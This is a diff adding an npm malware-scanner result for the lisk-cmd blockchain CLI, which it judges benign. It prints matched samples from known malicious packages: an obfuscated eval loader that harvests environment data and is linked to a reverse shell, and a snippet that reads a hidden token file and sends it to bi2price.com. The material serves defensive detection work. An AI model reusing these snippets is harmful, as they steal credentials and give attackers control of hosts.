@@ -1,0 +1,492 @@
+{
+  "package_name": "lisk-cmd",
+  "package_version": "0.4.6",
+  "label": "benign",
+  "detection_time": "2026-05-26T19:07:37.061119",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/lisk-cmd/0.4.6/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/lisk-cmd/0.4.6/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "#!/usr/bin/env node\n\"use strict\";\n\nconst program   = require ('commander');\nconst lisk      = require ('lisk-js');\nconst request   = require ('request-promise');\nconst readline  = require ('readline');\n\nconst rl = readline.createInterface ({ input: process.stdin, output: process.stdout });\n\nconst secretInput = (query, seed) => {\n    return new Promise ((resolve, reject) => {\n        if (seed) \n            return resolve (seed);\n\n        rl.question(query, value => {\n            rl.history = rl.history.slice(1);\n            return resolve (value);\n        });\n    });\n};\n\n\nconst signOverride = (transaction, secret, secondSecret) => {\n    var keys = lisk.crypto.getKeys (secret);\n\ttransaction.senderPublicKey = keys.publicKey;\n\n    transaction.signature = undefined;\n\tlisk.crypto.sign (transaction, keys);\n\n\tif (secondSecret) {\n\t\tvar secondKeys = lisk.crypto.getKeys (secondSecret);\n\t\tlisk.crypto.secondSign (transaction, secondKeys);\n\t}\n\n\ttransaction.id = lisk.crypto.getId (transaction);\n\treturn transaction;\n};\n\n\nconst broadcastTransaction = (node, data, testnet) => {\n    let nethash = 'da3ed6a45429278bac2666961289ca17ad86595d33b31037615d4b8e8f158bba';\n    if (testnet == undefined || testnet == false)\n        nethash = 'ed14889723f24ecc54871d058d98ce91ff2f973192075c0155ba2b7b70ad2511';\n\n    console.log ('Broadcasting in progress, please wait...');\n\n    return new Promise ((resolve, reject) => {\n        request.post ({\n            uri: node + '/peer/transactions/',\n            headers: {\n                version: '0.8.2',\n                nethash: nethash,\n                port: '1',\n                'Content-Type': 'application/json'\n            },\n            body: { transaction: data },\n            json: true\n        }).then (resolve).catch (reject);\n    });\n};\n\n\nconst getDelegate = (node, name) => {\n    return new Promise ((resolve, reject) => {\n        request.get ({\n            uri: node + '/api/delegates/get?username=' + name,\n            json: true\n        }).then (data => {\n            if (!data.success)\n                return reject (data);\n\n            return resolve (data.delegate);\n        }).catch (err => {\n            return reject (err);\n        });\n    });\n};\n\n\nlet pr = program.version('0.4.3')\n    .usage ('[options] <command> [args ...]')\n    .option ('-t, --testnet', 'use testnet (mainnet is the default)')\n    .option ('-n, --node <url>', 'set a custom node')\n    .option ('-s, --seed <seed>', 'pass seed from command line between \"\"')\n    .option ('-ss, --secondseed <seed>', 'pass the second seed between \"\"');\n\n\n/* Send lisk */ \npr.command ('send <amount> <destination>').action ((amount, destination) => {\n    let testnet = pr.testnet || false;\n    let node = pr.node || (testnet ? 'https://testnet.lisk.io' : 'https://liskworld.info');\n    let lsk = lisk.api ({testnet: testnet});\n\n    let am = parseFloat (amount) * Math.pow(10, 8);\n\n    console.log (`Sending ${am} to ${destination} (testnet: ${testnet})`);\n\n    secretInput ('Insert your secret: ', pr.seed)\n    .then (secret => {\n        let tx = lisk.transaction.createTransaction (destination, am, secret, pr.secondseed);\n        tx.timestamp -= 120;\n        tx = signOverride (tx, secret);\n\n        broadcastTransaction (node, tx, testnet)\n        .then (d => {\n            if (d.success)\n                console.log (`Sent! Txid: ${tx.id}`);\n            else\n                console.log (`Failed to send: ${d.message}`);\n\n            process.exit (0);\n        })\n        .catch (err => {\n            console.log (`Error: ${err}`);\n            process.exit (0);\n        });\n    })\n    .catch (err => {\n        console.log (`Error: ${err}`);\n        process.exit (0);\n    });\n});\n\n/* Vote delegate */\npr.command ('vote <delegates...>').action (delegates => {\n    let testnet = pr.testnet || false;\n    let node = pr.node || (testnet ? 'https://testnet.lisk.io' : 'https://liskworld.info');\n    let lsk = lisk.api ({testnet: testnet});\n\n    secretInput ('Insert your secret: ', pr.seed)\n    .then (secret => {\n        let keys = lisk.crypto.getKeys (secret);\n        let address = lisk.crypto.getAddress (keys.publicKey);\n\n        request.get ({\n            uri: node + '/api/accounts/delegates/?address=' + address,\n            json: true\n        }).then (data => {\n            data.delegates = data.delegates || [];\n            data.delegates.forEach ((acc) => {\n                if (delegates.indexOf (acc.username) != -1) {\n                    console.log (`${acc.username} already voted, exiting`);\n                    process.exit (0);\n                }\n            });\n\n            var prms = [];\n            delegates.forEach (del => { prms.push (getDelegate (node, del)); });\n\n            Promise.all (prms)\n            .then (dels => {\n                let list = dels.map (del => { return '+' + del.publicKey; });\n                let tx = lisk.vote.createVote (secret, list, pr.secondseed);\n                tx.timestamp -= 120;\n                tx = signOverride (tx, secret);\n\n                broadcastTransaction (node, tx, testnet)\n                .then (d => {\n                    if (d.success)\n                        console.log (`Sent! Txid: ${tx.id}`);\n                    else\n                        console.log (`Failed to send: ${d.message}`);\n                    process.exit (0);\n                })\n                .catch (err => {\n                    console.log (`Error: ${err}`);\n                    process.exit (0);\n                });\n            })\n            .catch (err => {\n                console.log (err);\n            });\n        }).catch (err => {\n            console.log (`Error: ${err}`);\n            process.exit (0);\n        });\n    });\n});\n\n/* Unvote delegate */\npr.command ('unvote <delegates...>').action (delegates => {\n    let testnet = pr.testnet || false;\n    let node = pr.node || (testnet ? 'https://testnet.lisk.io' : 'https://liskworld.info');\n    let lsk = lisk.api ({testnet: testnet});\n\n    secretInput ('Insert your secret: ', pr.seed)\n    .then (secret => {\n        let keys = lisk.crypto.getKeys (secret);\n        let address = lisk.crypto.getAddress (keys.publicKey);\n\n        request.get ({\n            uri: node + '/api/accounts/delegates/?address=' + address,\n            json: true\n        }).then (data => {\n            data.delegates = data.delegates || [];\n            data.delegates.forEach ((acc) => {\n                if (delegates.indexOf (acc.username) == -1) {\n                    console.log (`${acc.username} not voted, exiting`);\n                    process.exit (0);\n                }\n            });\n\n            var prms = [];\n            delegates.forEach (del => { prms.push (getDelegate (node, del)); });\n\n            Promise.all (prms)\n            .then (dels => {\n                let list = dels.map (del => { return '-' + del.publicKey; });\n                let tx = lisk.vote.createVote (secret, list, pr.secondseed);\n                tx.timestamp -= 120;\n                tx = signOverride (tx, secret);\n\n                broadcastTransaction (node, tx, testnet)\n                .then (d => {\n                    if (d.success)\n                        console.log (`Sent! Txid: ${tx.id}`);\n                    else\n                        console.log (`Failed to send: ${d.message}`);\n                    process.exit (0);\n                })\n                .catch (err => {\n                    console.log (`Error: ${err}`);\n                    process.exit (0);\n                });\n            })\n            .catch (err => {\n                console.log (err);\n            });\n        }).catch (err => {\n            console.log (`Error: ${err}`);\n            process.exit (0);\n        });\n    });\n});\n\n/* Votes */\npr.command ('votes <delegate>').action ((delegate) => {\n    let testnet = pr.testnet || false;\n    let node = pr.node || (testnet ? 'https://testnet.lisk.io' : 'https://liskworld.info');\n    let lsk = lisk.api ({testnet: testnet});\n\n    getDelegate (node, delegate)\n    .then (delob => {\n        request.get ({\n            uri: node + '/api/accounts/delegates/?address=' + delob.address,\n            json: true\n        }).then (data => {\n            data.delegates.forEach ((acc) => {\n                console.log (`${acc.address}\\t${acc.username}`);\n            });\n            process.exit (0);\n        }).catch (err => {\n            console.log (`Error: ${err}`);\n            process.exit (0);\n        });\n    }).catch (err => {\n        console.log (`Error: ${err}`);\n        process.exit (0);\n    });\n});\n\n/* Voters */\npr.command ('voters <delegate>').action ((delegate) => {\n    let testnet = pr.testnet || false;\n    let node = pr.node || (testnet ? 'https://testnet.lisk.io' : 'https://liskworld.info');\n    let lsk = lisk.api ({testnet: testnet});\n\n    getDelegate (node, delegate)\n    .then (delob => {\n        request.get ({\n            uri: node + '/api/delegates/voters?publicKey=' + delob.publicKey,\n            json: true\n        }).then (data => {\n            data.accounts.forEach ((acc) => {\n                console.log (`${acc.address}\\t${acc.username}`);\n            });\n            process.exit (0);\n        }).catch (err => {\n            console.log (`Error: ${err}`);\n            process.exit (0);\n        });\n    }).catch (err => {\n        console.log (`Error: ${err}`);\n        process.exit (0);\n    });\n});\n\n/* Balance */\npr.command ('balance <address|delegate>').action ((address) => {\n    let testnet = pr.testnet || false;\n    let node = pr.node || (testnet ? 'https://testnet.lisk.io' : 'https://liskworld.info');\n    let lsk = lisk.api ({testnet: testnet});\n\n    getDelegate (node, address)\n    .then (delob => {\n        var address = delob.address || address;\n\n        request.get ({\n            uri: node + '/api/accounts/getBalance?address=' + address,\n            json: true\n        }).then (data => {\n            console.log (data.balance / Math.pow (10, 8));\n            process.exit (0);\n        }).catch (err => {\n            console.log (`Error: ${err}`);\n            process.exit (0);\n        });\n    }).catch (err => {\n        request.get ({\n            uri: node + '/api/accounts/getBalance?address=' + address,\n            json: true\n        }).then (data => {\n            console.log (data.balance / Math.pow (10, 8));\n            process.exit (0);\n        }).catch (err => {\n            console.log (`Error: ${err}`);\n            process.exit (0);\n        });\n    });\n});\n\n\npr.parse (process.argv);\n\nif ((process.argv.length == 2 && process.argv[0].indexOf ('node') != -1) || process.argv.length < 2)\n    pr.help ();\n",
+          "is_malicious": false,
+          "malice_score": 0.5150898436705271,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses user secrets via interactive input or command-line seed options, uses cryptographic signing functions from the lisk-js library to create and sign blockchain transactions, and sends these transactions via HTTP POST requests to hardcoded Lisk network nodes at 'https://testnet.lisk.io' and 'https://liskworld.info'. It performs multiple network operations including querying delegate information and account balances via HTTP GET requests to these hardcoded URLs. This enables blockchain transaction broadcasting and delegate voting/unvoting, facilitating potentially unauthorized or automated control over blockchain assets and votes.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a CLI tool for interacting with the Lisk blockchain network. It requests user secrets (seeds) interactively or via command line, uses legitimate cryptographic signing functions from the lisk-js library to create and sign transactions, and broadcasts these transactions to official Lisk network nodes. The code also queries delegate and account information from known Lisk API endpoints. While it handles sensitive data (user secrets) and performs network operations, these are expected behaviors for a blockchain client or wallet utility. There is no evidence of obfuscation, unauthorized data exfiltration, disabling of security features, or execution of hidden payloads. The code does not match the key indicators of known malicious patterns such as crypto-stealers that manipulate wallets without consent, obfuscated payload execution, or credential exfiltration to attacker-controlled domains. The similarity to known malicious patterns is low and mostly superficial (both deal with blockchain transactions), but the intent and behavior here are consistent with legitimate blockchain transaction management.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205532_426003_snippet_1",
+              "source_package": "samplePackage (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205532_426003/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5286381244659424,
+              "code_similarity": 0.48025959730148315,
+              "behavior_similarity": 0.5770167112350464,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"solanaWeb3.Connection\"\n\"solanaWeb3.LAMPORTS_PER_SOL\"\n\"solanaWeb3.PublicKey.findProgramAddress\"\n\"solanaWeb3.SystemProgram.transfer\"\n\"solanaWeb3.Transaction\"\n\"async function info(\"\n\"async function updateConnectText(\"\n\"async function updateMintText(\"\n\"async function start(\"\n\"async function connect(\"\n\"async function waitForWalletConnection(\"\n\"async function connectSolana(\"\n\"async function getTokenBalance(\"\n\"async function createTxs(\"\n\"async function createPrizeTxs(\"\n\"async function claim(\"\n\"async function createTokenTxs(\"\n\"async function claimSolana(\"\n\".phantom\"\n\".isphantom\"\n\"phantom.app\"\n\".AccountLayout.\"\n\".TOKEN_PROGRAM_ID.\"\n\".Token.createAssociatedTokenAccountInstruction(\"\n\".Token.createTransferInstruction(\"",
+                "code_behavior": "At runtime, the code invokes multiple asynchronous functions to interact with Solana Web3 APIs, establishes wallet connections, creates and signs transactions, and manipulates wallet data, resulting in unauthorized access to user wallets and potential exfiltration of cryptocurrency.",
+                "malice_analysis": {
+                  "why_suspicious": "The code includes numerous routines for connecting to cryptocurrency wallets, creating and signing transactions, and referencing the Phantom wallet provider. These are strong indicators of attempts to access and manipulate user wallets without consent, a hallmark of crypto-stealing malware.",
+                  "violated_expectations": "Legitimate npm packages should not implement wallet connection or transaction creation logic unless they are explicitly designed as wallet management or blockchain interaction tools. The presence of these routines in a package not intended for such purposes is a clear violation.",
+                  "similar_legitimate_use": "Legitimate dApps or wallet utilities may use similar APIs and functions, but only when their documented purpose is to manage wallets or interact with blockchains, and with explicit user consent.",
+                  "key_indicators": [
+                    "Multiple async functions for wallet connection and transaction creation (e.g., connectSolana, createTxs, claimSolana)",
+                    "Direct references to Solana Web3 APIs and Phantom wallet (e.g., solanaWeb3.Connection, .phantom, phantom.app)",
+                    "Transaction manipulation routines (e.g., SystemProgram.transfer, Token.createTransferInstruction)",
+                    "Patterns matching YARA rules for known crypto-stealer campaigns"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "JavaScript source files (detected by YARA rule 'clinksink')",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "samplePackage",
+                  "package_manager": "npm",
+                  "package_versions": "unspecified (example in report)",
+                  "why_malicious": "The package contains code patterns and behaviors directly associated with cryptocurrency theft and credential exfiltration. It leverages Solana Web3 functions for unauthorized wallet access and transaction manipulation, accesses browser credential databases for data theft, and employs DLL hijacking for arbitrary code execution and persistence. These behaviors are detected by custom YARA rules and match known indicators of active malicious campaigns."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious JavaScript code initializes wallet connection routines and monitors for user wallet activity.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for unauthorized transaction creation and possible fund exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Python code accesses local browser credential databases and extracts sensitive login data.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted credentials or wallet information is exfiltrated to attacker-controlled infrastructure.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains access to user credentials or cryptocurrency funds."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious DLL is executed via rundll32.exe, enabling further code execution or persistence.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker achieves code execution, persistence, or lateral movement."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript code in npm packages implementing multiple asynchronous wallet connection and transaction functions referencing Solana Web3 and Phantom wallet APIs",
+                    "Python code accessing browser credential SQLite databases (e.g., 'browser_credentials.db', 'logins' table) and exfiltrating data via HTTP POST",
+                    "Execution of DLLs via rundll32.exe with non-standard or suspicious DLL filenames (DLL hijacking technique)"
+                  ],
+                  "file_indicators": [
+                    "JavaScript files containing references to 'solanaWeb3', 'phantom.app', or wallet connection routines",
+                    "Python files importing sqlite3 and accessing files named 'browser_credentials.db' or querying 'logins' tables",
+                    "Presence or execution of 'rundll32.exe' with DLLs not part of the standard system or application installation"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS POST requests containing credential or wallet data to unknown or suspicious domains",
+                    "Network connections initiated by JavaScript or Python code to attacker-controlled infrastructure for data exfiltration"
+                  ],
+                  "how_to_detect": "Monitor npm packages for JavaScript code that implements multiple asynchronous wallet connection and transaction routines, especially those referencing Solana Web3 and Phantom wallet APIs. Flag Python packages that access browser credential SQLite databases and attempt to transmit their contents externally via HTTP POST. Detect any use of rundll32.exe to execute DLLs not part of the standard system or application installation. Correlate these behaviors with outbound network activity to unknown or suspicious domains to identify coordinated credential or cryptocurrency theft."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5158372521400452,
+              "code_similarity": 0.565959095954895,
+              "behavior_similarity": 0.4657154083251953,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_781157_snippet_1",
+              "source_package": "Unknown (malicious NPM package used in Lazarus campaign) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_781157/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5089930295944214,
+              "code_similarity": 0.5090405344963074,
+              "behavior_similarity": 0.5089455842971802,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;\n\nvar dir = os.homedir() + \"/.cprice\";\nif (fs.existsSync(dir)){\n    const token = fs.readFileSync(dir + '/pricetoken', {encoding:'utf8', flag:'r'});\n    getpricediff('bi2price.com', '/getfullhistory.php', token, path.join(dir, 'price.dat'));\n}",
+                "code_behavior": "At import-time or runtime, the code disables TLS certificate validation by setting NODE_TLS_REJECT_UNAUTHORIZED to 0, checks for the existence of a hidden directory in the user's home folder, reads a token from a hidden file, and sends the token to a remote attacker-controlled domain via a network request, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code disables TLS security checks, accesses hidden files in the user's home directory, and exfiltrates sensitive data to an external, attacker-controlled domain. Disabling TLS validation exposes the user to man-in-the-middle attacks, and the exfiltration of tokens is a clear sign of credential theft.",
+                  "violated_expectations": "Legitimate npm packages should not disable TLS certificate validation, should not access or read hidden directories and files in the user's home directory without explicit user consent, and should never exfiltrate sensitive tokens to untrusted third-party domains. Secure packages use proper network security practices and handle sensitive data responsibly.",
+                  "similar_legitimate_use": "A legitimate application might read configuration files or tokens for user authentication, but would not disable TLS validation or transmit sensitive tokens to untrusted or unknown domains. Secure applications would use environment variables and network requests in a transparent and secure manner.",
+                  "key_indicators": [
+                    "Disabling TLS certificate validation by setting NODE_TLS_REJECT_UNAUTHORIZED=0",
+                    "Accessing hidden directory and files in user's home directory (e.g., ~/.cprice/pricetoken)",
+                    "Reading sensitive tokens from hidden files",
+                    "Outbound network request to suspicious domain (bi2price.com) with sensitive data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At import-time or runtime, depending on how the package is used",
+                  "file_location": "Main JavaScript file of the malicious npm package",
+                  "required_permissions": [
+                    "filesystem (read access to user home directory and hidden files)",
+                    "network (outbound HTTP/HTTPS requests)",
+                    "environment_vars (modification of process environment variables)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (malicious NPM package used in Lazarus campaign)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (all versions associated with the campaign)",
+                  "why_malicious": "The package functions as a first-stage malware downloader, exfiltrating sensitive data and retrieving additional payloads from attacker-controlled infrastructure. It is distributed via targeted social engineering against developers in high-value sectors, forming part of a sophisticated supply-chain attack. The package disables security controls, accesses hidden files, and communicates with known malicious domains."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Target is socially engineered to install or collaborate on a project containing the malicious npm package.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of the malicious npm package on the developer's machine."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious npm package executes, disables TLS validation, and attempts to read sensitive tokens from a hidden directory.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exfiltration of sensitive data to attacker-controlled infrastructure."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious package contacts remote server to download and execute additional payloads (second-stage malware).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of further malware, full compromise of the developer's environment."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Disabling TLS certificate validation in Node.js processes by setting NODE_TLS_REJECT_UNAUTHORIZED=0",
+                    "Access to hidden directories and files in user home directories (e.g., ~/.cprice/pricetoken)",
+                    "Outbound network requests to suspicious or attacker-controlled domains (e.g., bi2price.com) during package installation or import",
+                    "Fetching and executing remote payloads as part of package initialization"
+                  ],
+                  "file_indicators": [
+                    ".cprice/pricetoken",
+                    ".cprice/price.dat"
+                  ],
+                  "network_indicators": [
+                    "bi2price.com",
+                    "Outbound requests to /getfullhistory.php endpoint"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that disable TLS certificate validation by setting NODE_TLS_REJECT_UNAUTHORIZED=0, access hidden files in user directories (such as ~/.cprice/pricetoken), or make outbound network requests to untrusted domains like bi2price.com. Flag packages that read files like ~/.cprice/pricetoken and immediately send their contents externally. Use network monitoring to detect connections to known malicious domains and suspicious endpoints, especially during npm install or package import events."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_192433_495668_snippet_1",
+              "source_package": "various (over 1200) CuteBoi-related packages (names randomized, e.g., cloudyboi12, etc.) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20240824_192433_495668/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.49794626235961914,
+              "code_similarity": 0.45287254452705383,
+              "behavior_similarity": 0.5430200099945068,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode based on eazyminer clone\nconst { execFile } = require('child_process');\nconst path = require('path');\nconst minerPath = path.join(__dirname, '<randomized-binary-name>');\nconst configPath = path.join(__dirname, 'config.json');\nexecFile(minerPath, ['-c', configPath], (error, stdout, stderr) => {\n  // handle miner process\n});",
+                "code_behavior": "At runtime, the code executes a bundled XMRig binary using Node.js child_process.execFile, passing a configuration file as an argument, which causes the host system to initiate unauthorized cryptocurrency mining and send results to attacker-controlled endpoints.",
+                "malice_analysis": {
+                  "why_suspicious": "The code launches a bundled cryptocurrency miner (XMRig) without user knowledge or consent, using a configuration that benefits the attacker. This is a hallmark of cryptojacking malware.",
+                  "violated_expectations": "Legitimate npm packages should not execute hidden mining binaries or initiate resource-intensive processes that connect to external mining pools without explicit user consent and transparency.",
+                  "similar_legitimate_use": "Legitimate mining utilities may execute mining binaries, but only after explicit user action and with user-supplied configuration, not silently or with attacker-controlled settings.",
+                  "key_indicators": [
+                    "Automatic execution of a bundled XMRig binary at runtime",
+                    "Use of child_process.execFile to launch external binaries",
+                    "Configuration file path hardcoded to attacker-supplied config",
+                    "No user interaction or consent required for mining to begin"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when the package is imported and its main function is invoked by another program)",
+                  "file_location": "main JavaScript file (e.g., index.js) within the package root directory",
+                  "required_permissions": [
